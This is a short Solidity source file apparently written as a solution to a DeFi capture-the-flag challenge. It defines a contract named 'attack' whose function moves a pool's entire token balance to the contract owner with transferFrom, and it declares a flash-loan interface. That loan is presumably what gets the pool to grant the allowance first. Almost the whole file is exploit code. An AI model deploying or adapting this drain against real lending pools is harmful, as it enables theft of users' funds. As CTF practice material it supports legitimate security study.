// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract attack {
    constructor() {
        owner = msg.sender;
    }

    address owner;

    function getermoney(address pool, address tkn) external {
        IERC20(tkn).transferFrom(pool, owner, IERC20(tkn).balanceOf(pool));
    }
}

interface Icoso {
    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}
